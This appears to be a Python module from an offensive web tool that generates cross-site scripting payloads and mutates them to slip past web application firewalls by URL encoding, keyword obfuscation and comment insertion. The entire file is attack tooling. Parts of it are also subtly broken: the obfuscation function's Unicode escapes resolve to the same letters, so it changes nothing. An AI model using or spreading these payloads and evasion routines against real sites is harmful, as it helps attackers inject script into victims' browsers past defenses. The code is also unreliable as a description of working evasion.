# core/waf_bypass.py placeholder


# core/waf_bypass.py

import random

# Basic XSS payloads to mutate
base_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "<body onload=alert(1)>"
]

def encode_payload(payload):
    """
    Encode parts of payload to evade simple WAF filters.
    """
    encoded = payload.replace("<", "%3C").replace(">", "%3E").replace("\"", "%22").replace(" ", "%20")
    return encoded

def obfuscate_js(payload):
    """
    Obfuscate JS-based payloads for bypassing WAFs.
    """
    return payload.replace("alert", "al\u0065rt").replace("onerror", "onerr\u006Fr")

def insert_comments(payload):
    """
    Insert comments or nulls to break pattern matching in WAFs.
    """
    return payload.replace("<script>", "<scr<!-- -->ipt>").replace("alert", "al<!-- -->ert")

def generate_bypass_payloads():
    """
    Generate a list of mutated/bypassed payloads.
    """
    bypassed = []
    for payload in base_payloads:
        bypassed.append(payload)
        bypassed.append(encode_payload(payload))
        bypassed.append(obfuscate_js(payload))
        bypassed.append(insert_comments(payload))
    return list(set(bypassed))  # Remove duplicates

def get_random_bypass_payload():
    """
    Return a single random bypassed payload.
    """
    return random.choice(generate_bypass_payloads())
